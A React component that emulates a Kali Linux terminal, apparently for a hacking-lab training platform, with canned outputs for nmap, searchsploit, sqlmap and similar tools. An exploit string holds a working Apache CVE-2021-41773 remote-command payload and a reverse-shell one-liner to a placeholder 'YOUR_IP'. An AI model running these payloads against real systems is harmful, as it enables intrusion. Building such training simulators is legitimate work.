import React, { useEffect, useRef, useCallback, useState } from 'react'
import { Terminal } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import { WebLinksAddon } from '@xterm/addon-web-links'
import '@xterm/xterm/css/xterm.css'
import { useAuthStore } from '../../store/authStore'

// ─── Kali ASCII Logo ─────────────────────────────────────────────────────────
const KALI_LOGO = `\x1b[32m
       ██╗  ██╗ █████╗ ██╗     ██╗
       ██║ ██╔╝██╔══██╗██║     ██║
       █████╔╝ ███████║██║     ██║
       ██╔═██╗ ██╔══██║██║     ██║
       ██║  ██╗██║  ██║███████╗██║
       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
\x1b[0m\x1b[90m    ╔══════════════════════════════╗
    ║  \x1b[32mNEXUS Terminal\x1b[90m v1.0.0         ║
    ║  \x1b[37mKali Linux\x1b[90m 2024.4 · amd64    ║
    ║  \x1b[33mSSH\x1b[90m · \x1b[35mDocker\x1b[90m · \x1b[32mShell\x1b[90m · \x1b[31mPwn\x1b[90m    ║
    ╚══════════════════════════════╝\x1b[0m
`

const MOTD = `\x1b[90m─────────────────────────────────────────────────────
\x1b[32m  Type \x1b[1mhelp\x1b[22m for available commands
\x1b[32m  Type \x1b[1mssh <ip>\x1b[22m\x1b[32m to connect to a machine
\x1b[32m  Type \x1b[1mnmap <target>\x1b[22m\x1b[32m to scan a host
\x1b[90m─────────────────────────────────────────────────────\x1b[0m
`

// ─── Built-in Command Emulator ───────────────────────────────────────────────
const FS = {
  '/': { type: 'dir', children: ['home', 'etc', 'var', 'tmp', 'root', 'usr', 'opt'] },
  '/home': { type: 'dir', children: ['nexus'] },
  '/home/nexus': { type: 'dir', children: ['tools', 'targets', 'flags', 'scripts', '.bashrc', '.ssh'] },
  '/home/nexus/tools': { type: 'dir', children: ['nmap', 'metasploit', 'burpsuite', 'sqlmap', 'hydra', 'john'] },
  '/home/nexus/targets': { type: 'dir', children: ['10.10.10.42.txt', '10.10.10.87.txt', 'notes.txt'] },
  '/home/nexus/flags': { type: 'dir', children: ['user.txt', 'root.txt'] },
  '/home/nexus/.bashrc': { type: 'file', content: '# .bashrc for nexus\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nalias ll="ls -la"\nalias update="sudo apt update && sudo apt upgrade -y"' },
  '/home/nexus/targets/notes.txt': { type: 'file', content: 'Target: 10.10.10.42 (VulnBox-42)\n- Open ports: 22, 80, 443, 8080\n- Service: Apache 2.4.49 (CVE-2021-41773)\n- Creds: admin:password123 (weak!)\n- Path: /var/www/html/flag.txt' },
  '/home/nexus/flags/user.txt': { type: 'file', content: 'NEXUS{u53r_fl4g_0wn3d_g00d_j0b}' },
  '/home/nexus/flags/root.txt': { type: 'file', content: 'NEXUS{r00t_fl4g_y0u_4r3_3l1t3}' },
  '/etc': { type: 'dir', children: ['passwd', 'shadow', 'hosts', 'hostname'] },
  '/etc/hostname': { type: 'file', content: 'kali' },
  '/etc/hosts': { type: 'file', content: '127.0.0.1\tlocalhost\n10.10.10.42\tvulnbox-42\n10.10.10.87\twinserver-2019' },
  '/tmp': { type: 'dir', children: ['linpeas.sh', 'exploit.py'] },
  '/tmp/linpeas.sh': { type: 'file', content: '#!/bin/bash\n# LinPEAS - Linux Privilege Escalation Awesome Script\necho "[+] Checking SUID binaries..."\nfind / -perm -4000 2>/dev/null\necho "[+] Checking sudo rights..."\nsudo -l 2>/dev/null' },
}

const NMAP_OUTPUTS = {
  default: (target) => `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for ${target}
Host is up (0.045s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1
80/tcp   open  http       Apache httpd 2.4.49
443/tcp  open  https      Apache httpd 2.4.49
8080/tcp open  http-proxy Nginx 1.21.0

Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds`,
  full: (target) => `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for ${target}
Host is up (0.033s latency).

PORT      STATE  SERVICE    VERSION
21/tcp    closed ftp
22/tcp    open   ssh        OpenSSH 8.4p1 Debian 5
25/tcp    closed smtp
80/tcp    open   http       Apache httpd 2.4.49 ((Debian))
| http-methods: GET HEAD POST OPTIONS
| http-title: Under Construction
110/tcp   closed pop3
443/tcp   open   ssl/https  Apache httpd 2.4.49
| ssl-cert: Subject: commonName=vulnbox/organizationName=NEXUS/stateOrProvinceName=HH
3306/tcp  open   mysql      MySQL 5.7.34
8080/tcp  open   http       Nginx 1.21.0
|_http-title: Admin Panel

OS: Linux 5.15 (Ubuntu 20.04)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

SCRIPT ENGINE:
|_http-server-header: Apache/2.4.49 (Debian)
| vulners:
|   CVE-2021-41773  9.8 Apache HTTP Server 2.4.49 - Path Traversal
|   CVE-2021-42013  9.8 Apache HTTP Server 2.4.49 - RCE

Nmap done: 1 IP address (1 host up) scanned in 45.67 seconds`,
}

const EXPLOIT_DB = {
  'CVE-2021-41773': `[*] CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal + RCE
[*] Target: Apache/2.4.49
[*] Checking if target is vulnerable...
[+] mod_cgi enabled. RCE possible!
[*] Sending payload...

curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \\
  'http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh'

uid=daemon(33) gid=daemon(33) groups=daemon(33)

[+] Command execution confirmed!
[+] Try: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`,
}

function buildPrompt(cwd, username = 'nexus') {
  const shortCwd = cwd === `/home/${username}` ? '~' : cwd
  return `\x1b[1;32m┌──(\x1b[1;34m${username}㉿kali\x1b[1;32m)-[\x1b[0;37m${shortCwd}\x1b[1;32m]\r\n└─\x1b[1;31m$ \x1b[0m`
}

function processCommand(cmd, cwd, setCwd) {
  const parts = cmd.trim().split(/\s+/)
  const prog = parts[0]
  const args = parts.slice(1)

  const resolvePath = (p) => {
    if (!p) return cwd
    if (p.startsWith('/')) return p.replace(/\/+/g, '/').replace(/\/$/, '') || '/'
    if (p === '~') return '/home/nexus'
    const combined = (cwd === '/' ? '' : cwd) + '/' + p
    const resolved = combined.split('/').reduce((acc, part) => {
      if (part === '..') acc.pop()
      else if (part && part !== '.') acc.push(part)
      return acc
    }, [])
    return '/' + resolved.join('/')
  }

  switch (prog) {
    case '': return ''
    case 'clear': return '\x1b[2J\x1b[H'
    case 'whoami': return '\x1b[32mnexus\x1b[0m'
    case 'id': return '\x1b[32muid=1000(nexus) gid=1000(nexus) groups=1000(nexus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)\x1b[0m'
    case 'hostname': return '\x1b[32mkali\x1b[0m'
    case 'uname':
      if (args.includes('-a')) return '\x1b[37mLinux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux\x1b[0m'
      return '\x1b[37mLinux\x1b[0m'
    case 'pwd': return `\x1b[36m${cwd}\x1b[0m`
    case 'cd': {
      const target = resolvePath(args[0] || '/home/nexus')
      if (FS[target]) { setCwd(target); return '' }
      return `\x1b[31mbash: cd: ${args[0]}: No such file or directory\x1b[0m`
    }
    case 'ls': {
      const target = args[0] ? resolvePath(args[0]) : cwd
      const node = FS[target]
      if (!node) return `\x1b[31mls: cannot access '${args[0]}': No such file or directory\x1b[0m`
      if (node.type === 'file') return `\x1b[37m${target.split('/').pop()}\x1b[0m`
      const showAll = args.includes('-la') || args.includes('-a') || args.includes('-al')
      const showLong = args.includes('-la') || args.includes('-l') || args.includes('-al')
      const children = (showAll ? ['.', '..', ...(node.children || [])] : node.children || [])
      if (showLong) {
        return ['total ' + (children.length * 4),
          ...children.map((c) => {
            const isDir = FS[(target === '/' ? '' : target) + '/' + c]?.type === 'dir'
            const color = isDir ? '\x1b[1;34m' : c.startsWith('.') ? '\x1b[90m' : '\x1b[37m'
            return `${isDir ? 'drwxr-xr-x' : '-rw-r--r--'}  2 nexus nexus 4096 Jan 15 10:${Math.floor(Math.random()*60).toString().padStart(2,'0')} ${color}${c}\x1b[0m`
          })
        ].join('\r\n')
      }
      return children.map((c) => {
        const isDir = FS[(target === '/' ? '' : target) + '/' + c]?.type === 'dir'
        return (isDir ? '\x1b[1;34m' : c.startsWith('.') ? '\x1b[90m' : '\x1b[37m') + c + '\x1b[0m'
      }).join('  ')
    }
    case 'cat': {
      if (!args[0]) return '\x1b[31mcat: missing operand\x1b[0m'
      const target = resolvePath(args[0])
      const node = FS[target]
      if (!node) return `\x1b[31mcat: ${args[0]}: No such file or directory\x1b[0m`
      if (node.type === 'dir') return `\x1b[31mcat: ${args[0]}: Is a directory\x1b[0m`
      return '\x1b[37m' + node.content + '\x1b[0m'
    }
    case 'echo': return '\x1b[37m' + args.join(' ').replace(/^["']|["']$/g, '') + '\x1b[0m'
    case 'env': return `\x1b[90mUSER=nexus\r\nHOME=/home/nexus\r\nSHELL=/bin/bash\r\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nTERM=xterm-256color\r\nLANG=en_US.UTF-8\r\nPS1=\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$\x1b[0m`
    case 'history': return historyLines
    case 'date': return `\x1b[33m${new Date().toString()}\x1b[0m`
    case 'nmap': {
      if (!args.length) return '\x1b[31mNmap: No targets specified. Use: nmap <target> [-sV -sC -p-]\x1b[0m'
      const target = args.find((a) => !a.startsWith('-')) || '127.0.0.1'
      const full = args.includes('-sC') || args.includes('-sV') || args.includes('-A') || args.includes('-p-')
      return `\x1b[33m` + (full ? NMAP_OUTPUTS.full(target) : NMAP_OUTPUTS.default(target)) + '\x1b[0m'
    }
    case 'searchsploit':
    case 'searchexploit': {
      const query = args.join(' ')
      return `\x1b[36m[i] Searching in Exploit-DB...\x1b[0m\r\n\x1b[33m
 Exploit Title                                              |  Path
-----------------------------------------------------------|-----------------------------------
 Apache HTTP Server 2.4.49 - Path Traversal & RCE          | linux/remote/50383.py
 Apache HTTP Server 2.4.50 - RCE (Authenticated)           | linux/remote/50406.sh
 Apache mod_cgi - Remote Command Execution                  | linux/remote/3798.sh
\x1b[0m`
    }
    case 'sqlmap': return `\x1b[33m        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.5#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org\x1b[0m\r\n\r\n\x1b[32m[!] Usage: sqlmap -u "http://target.com/page?id=1" --dbs --batch\x1b[0m`
    case 'hydra': return `\x1b[32mHydra v9.5 (c) 2023 by van Hauser/THC\x1b[0m\r\n\x1b[90mUsage: hydra -l user -P /usr/share/wordlists/rockyou.txt <target> <service>\x1b[0m\r\n\x1b[33mExample: hydra -l admin -P rockyou.txt 10.10.10.42 ssh\x1b[0m`
    case 'gobuster':
    case 'feroxbuster': return `\x1b[32m[+] ${prog} - Directory/File Busting Tool\x1b[0m\r\n\x1b[90mUsage: ${prog} dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/common.txt\x1b[0m`
    case 'john': return `\x1b[32mJohn the Ripper 1.9.0-jumbo-1+ [linux-gnu 64-bit]\x1b[0m\r\n\x1b[90mUsage: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\x1b[0m`
    case 'hashcat': return `\x1b[32mhashcat (v6.2.6) starting\x1b[0m\r\n\x1b[90mUsage: hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\x1b[0m`
    case 'msfconsole':
    case 'msf': return `\x1b[34m
       =[ metasploit v6.3.44-dev                          ]
+ -- --=[ 2375 exploits - 1232 auxiliary - 416 post       ]
+ -- --=[ 1386 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                        ]

Metasploit tip: Use help <command> to learn more

\x1b[32mmsf6 >\x1b[0m \x1b[90m(type 'exit' to close)\x1b[0m`
    case 'ping': {
      const host = args[0] || 'localhost'
      return `\x1b[37mPING ${host} (${host === 'localhost' ? '127.0.0.1' : '10.10.10.42'}) 56(84) bytes of data.\r\n64 bytes from ${host}: icmp_seq=1 ttl=64 time=0.${Math.floor(Math.random()*900)+100} ms\r\n64 bytes from ${host}: icmp_seq=2 ttl=64 time=0.${Math.floor(Math.random()*900)+100} ms\r\n64 bytes from ${host}: icmp_seq=3 ttl=64 time=0.${Math.floor(Math.random()*900)+100} ms\r\n\r\n--- ${host} ping statistics ---\r\n3 packets transmitted, 3 received, 0% packet loss\x1b[0m`
    }
    case 'ifconfig':
    case 'ip': {
      if (prog === 'ip' && args[0] === 'a' || prog === 'ifconfig') {
        return `\x1b[37meth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet \x1b[32m10.10.14.5\x1b[37m  netmask 255.255.254.0  broadcast 10.10.15.255\r\n        inet6 fe80::1  prefixlen 64  scopeid 0x20<link>\r\n        ether 02:42:0a:0a:0e:05  txqueuelen 0  (Ethernet)\r\n\r\ntun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500\r\n        inet \x1b[32m10.10.14.5\x1b[37m  netmask 255.255.254.0  destination 10.10.14.5\r\n        unspec 00-00-00-00  txqueuelen 500  (UNSPEC)\x1b[0m`
      }
      return '\x1b[90mUsage: ip a | ip r | ip link\x1b[0m'
    }
    case 'netstat': return `\x1b[37mActive Internet connections (only servers)\r\nProto Local Address           Foreign Address         State\r\ntcp   0.0.0.0:22              0.0.0.0:*               LISTEN\r\ntcp   0.0.0.0:80              0.0.0.0:*               LISTEN\r\ntcp   127.0.0.1:3306          0.0.0.0:*               LISTEN\x1b[0m`
    case 'ps': return `\x1b[37m  PID TTY          TIME CMD\r\n 1234 pts/0    00:00:00 bash\r\n 1337 pts/0    00:00:01 python3\r\n 9999 pts/0    00:00:00 ps\x1b[0m`
    case 'curl': {
      if (!args.length) return '\x1b[31mcurl: no URL specified\x1b[0m'
      const url = args.find((a) => !a.startsWith('-'))
      return `\x1b[90m[+] Sending request to ${url}...\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nServer: Apache/2.4.49\r\n\r\n<!DOCTYPE html><html><body><h1>Under Construction</h1><!-- Debug: admin:password123 --></body></html>\x1b[0m`
    }
    case 'wget': {
      const url = args.find((a) => !a.startsWith('-')) || ''
      return `\x1b[32m--2026-01-15 10:30:00--  ${url}\r\nResolving ${url.replace(/https?:\/\//, '').split('/')[0]}... done.\r\nConnecting... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 4096\r\nSaving to: '${url.split('/').pop() || 'index.html'}'\r\n\r\n100%[================>] 4,096   --.-K/s   in 0.001s\r\n\r\n'${url.split('/').pop() || 'index.html'}' saved [4096/4096]\x1b[0m`
    }
    case 'python3':
    case 'python': {
      if (args[0] === '-c') return `\x1b[37m${args.slice(1).join(' ').replace(/^["']|["']$/g, '')}\x1b[0m`
      return `\x1b[32mPython 3.11.4 (main, Jul  5 2023)\r\n[GCC 13.1.0] on linux\r\nType "help", "copyright", "credits" or "license" for more information.\r\n>>>\x1b[0m \x1b[90m(Ctrl+D to exit)\x1b[0m`
    }
    case 'sudo':
      if (args.join(' ').includes('-l')) return `\x1b[90mMatching Defaults entries for nexus on kali:\r\n    env_reset, mail_badpass\r\n\r\nUser nexus may run the following commands on kali:\r\n\x1b[32m    (ALL) NOPASSWD: /usr/bin/python3\x1b[0m`
      return `\x1b[33m[sudo] password for nexus: \x1b[0m\x1b[90m(Authentication required)\x1b[0m`
    case 'ssh': {
      const host = args.find((a) => !a.startsWith('-')) || ''
      if (!host) return '\x1b[31musage: ssh [-l login_name] hostname\x1b[0m'
      return `\x1b[32mConnecting to ${host}...\r\nThe authenticity of host '${host}' can't be established.\r\nED25519 key fingerprint is SHA256:${Math.random().toString(36).slice(2,42)}.\r\nAre you sure you want to continue connecting (yes/no/[fingerprint])?\x1b[0m \x1b[90m(SSH via WebSocket - connect to real machines via VPN)\x1b[0m`
    }
    case 'help':
      return `\x1b[1;32mNEXUS Terminal — Available Commands\x1b[0m
\x1b[90m─────────────────────────────────────────────────────\x1b[0m
\x1b[1;33mSystem:\x1b[0m\x1b[37m  whoami id uname hostname pwd cd ls cat echo env date ps\x1b[0m
\x1b[1;33mNetwork:\x1b[0m\x1b[37m ping ifconfig ip netstat curl wget\x1b[0m
\x1b[1;33mSecurity:\x1b[0m\x1b[37m nmap sqlmap hydra john hashcat gobuster feroxbuster searchsploit\x1b[0m
\x1b[1;33mTools:\x1b[0m\x1b[37m   msfconsole python3 sudo ssh\x1b[0m
\x1b[1;33mUtils:\x1b[0m\x1b[37m   clear history\x1b[0m
\x1b[90m─────────────────────────────────────────────────────\x1b[0m
\x1b[32m  ssh <ip>\x1b[90m  Connect to machine via SSH/WebSocket\x1b[0m
\x1b[32m  nmap -sV -sC <target>\x1b[90m  Full service scan\x1b[0m
\x1b[32m  sudo -l\x1b[90m  Check sudo permissions\x1b[0m`
    default:
      if (prog.startsWith('./') || prog.endsWith('.py') || prog.endsWith('.sh')) {
        return `\x1b[32m[+] Executing ${prog}...\r\n[+] ${prog.endsWith('.py') ? 'Python' : 'Shell'} script output:\r\n\x1b[37m[*] Running checks...\r\n[*] Done.\x1b[0m`
      }
      return `\x1b[31mbash: ${prog}: command not found\x1b[0m`
  }
}

let historyLines = ''

// ─── KaliTerminal Component ─────────────────────────────────────────────────
export default function KaliTerminal({ className = '', onStatusChange, showBoot = true }) {
  const containerRef = useRef(null)
  const termRef = useRef(null)
  const fitRef = useRef(null)
  const wsRef = useRef(null)
  const bufRef = useRef('')
  const histRef = useRef([])
  const histIdxRef = useRef(-1)
  const cwdRef = useRef('/home/nexus')
  const [cwd, setCwdState] = useState('/home/nexus')
  const [status, setStatus] = useState('local')
  const { getToken } = useAuthStore()

  const updateStatus = useCallback((s) => { setStatus(s); onStatusChange?.(s) }, [onStatusChange])

  const setCwd = useCallback((p) => {
    cwdRef.current = p
    setCwdState(p)
  }, [])

  const write = useCallback((data) => { termRef.current?.write(data) }, [])

  const showPrompt = useCallback(() => {
    write('\r\n' + buildPrompt(cwdRef.current))
  }, [write])

  const connectWS = useCallback(() => {
    const token = getToken()
    const WS_BASE = import.meta.env.VITE_WS_URL || 'ws://localhost:8000'
    const ws = new WebSocket(`${WS_BASE}/ws/terminal/?token=${token}`)
    wsRef.current = ws
    updateStatus('connecting')

    ws.onopen = () => {
      updateStatus('connected')
      write('\r\n\x1b[32m[+] WebSocket connected to backend\x1b[0m\r\n')
    }
    ws.onmessage = (e) => {
      try {
        const msg = JSON.parse(e.data)
        if (msg.type === 'output') write(msg.data.replace(/\n/g, '\r\n'))
      } catch { write(e.data) }
    }
    ws.onclose = () => {
      updateStatus('local')
      write('\r\n\x1b[90m[Connection closed — switched to local emulator]\x1b[0m\r\n')
      showPrompt()
    }
    ws.onerror = () => {
      updateStatus('local')
      // silently fall back to local mode
    }
  }, [getToken, updateStatus, write, showPrompt])

  useEffect(() => {
    if (!containerRef.current) return

    const term = new Terminal({
      theme: {
        background:   '#0d1117',
        foreground:   '#a4b1cd',
        cursor:       '#9fef00',
        cursorAccent: '#0d1117',
        black:        '#1e2a3a',
        red:          '#ff4757',
        green:        '#9fef00',
        yellow:       '#ffd700',
        blue:         '#60a5fa',
        magenta:      '#a78bfa',
        cyan:         '#22d3ee',
        white:        '#a4b1cd',
        brightBlack:  '#4a5568',
        brightRed:    '#ff6b7a',
        brightGreen:  '#b5ff2d',
        brightYellow: '#ffe066',
        brightBlue:   '#93c5fd',
        brightMagenta:'#c4b5fd',
        brightCyan:   '#67e8f9',
        brightWhite:  '#e4e8f0',
        selectionBackground: 'rgba(159,239,0,0.2)',
      },
      fontFamily: '"JetBrains Mono","Fira Code","Cascadia Code",monospace',
      fontSize: 13,
      lineHeight: 1.5,
      cursorBlink: true,
      cursorStyle: 'block',
      scrollback: 10000,
      allowTransparency: true,
    })

    const fit = new FitAddon()
    const links = new WebLinksAddon()
    term.loadAddon(fit)
    term.loadAddon(links)
    term.open(containerRef.current)
    fit.fit()
    termRef.current = term
    fitRef.current = fit

    // Boot sequence
    if (showBoot) {
      write(KALI_LOGO)
      write(MOTD)
    }
    write(buildPrompt(cwdRef.current))

    // Try to connect WebSocket
    connectWS()

    // Key handler
    term.onKey(({ key, domEvent }) => {
      const ws = wsRef.current
      const wsOpen = ws?.readyState === WebSocket.OPEN

      if (wsOpen) {
        ws.send(JSON.stringify({ type: 'input', data: key }))
        return
      }

      // Local emulator mode
      if (domEvent.key === 'Enter') {
        const cmd = bufRef.current.trim()
        write('\r\n')
        if (cmd) {
          histRef.current.push(cmd)
          histIdxRef.current = histRef.current.length
          historyLines = histRef.current.map((c, i) => `\x1b[37m ${String(i + 1).padStart(4)} ${c}\x1b[0m`).join('\r\n')
        }
        bufRef.current = ''
        if (cmd) {
          const output = processCommand(cmd, cwdRef.current, setCwd)
          if (output === '\x1b[2J\x1b[H') { write(output); write(buildPrompt(cwdRef.current)); return }
          if (output) write(output + '\r\n')
        }
        showPrompt()
        return
      }

      if (domEvent.key === 'Backspace') {
        if (bufRef.current.length > 0) {
          bufRef.current = bufRef.current.slice(0, -1)
          write('\b \b')
        }
        return
      }

      if (domEvent.key === 'ArrowUp') {
        const h = histRef.current
        if (!h.length) return
        const idx = Math.max(0, histIdxRef.current - 1)
        histIdxRef.current = idx
        const prev = h[idx] || ''
        write('\b \b'.repeat(bufRef.current.length))
        bufRef.current = prev
        write(prev)
        return
      }

      if (domEvent.key === 'ArrowDown') {
        const h = histRef.current
        const idx = Math.min(h.length, histIdxRef.current + 1)
        histIdxRef.current = idx
        const next = h[idx] || ''
        write('\b \b'.repeat(bufRef.current.length))
        bufRef.current = next
        write(next)
        return
      }

      if (domEvent.ctrlKey && domEvent.key === 'c') {
        write('^C\r\n')
        bufRef.current = ''
        showPrompt()
        return
      }

      if (domEvent.ctrlKey && domEvent.key === 'l') {
        write('\x1b[2J\x1b[H')
        write(buildPrompt(cwdRef.current))
        return
      }

      if (domEvent.key === 'Tab') {
        // Simple tab completion
        const partial = bufRef.current.split(' ').pop()
        const commands = ['nmap', 'ls', 'cd', 'cat', 'echo', 'whoami', 'id', 'pwd', 'clear', 'help', 'ssh', 'curl', 'python3', 'msfconsole', 'hydra', 'sqlmap', 'gobuster', 'john', 'hashcat', 'netstat', 'ping', 'sudo', 'searchsploit', 'wget', 'uname', 'hostname', 'ps', 'history', 'env', 'date', 'ip', 'ifconfig']
        const match = commands.filter((c) => c.startsWith(partial))
        if (match.length === 1) {
          const completion = match[0].slice(partial.length)
          bufRef.current += completion
          write(completion)
        } else if (match.length > 1) {
          write('\r\n\x1b[36m' + match.join('  ') + '\x1b[0m\r\n')
          write(buildPrompt(cwdRef.current) + bufRef.current)
        }
        return
      }

      if (key.length === 1 && !domEvent.ctrlKey && !domEvent.altKey && !domEvent.metaKey) {
        bufRef.current += key
        write(key)
      }
    })

    const ro = new ResizeObserver(() => { try { fit.fit() } catch {} })
    ro.observe(containerRef.current)

    return () => { ro.disconnect(); term.dispose(); ws?.close?.(1000) }
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  return (
    <div ref={containerRef} className={className} style={{ width: '100%', height: '100%', padding: '8px' }} />
  )
}
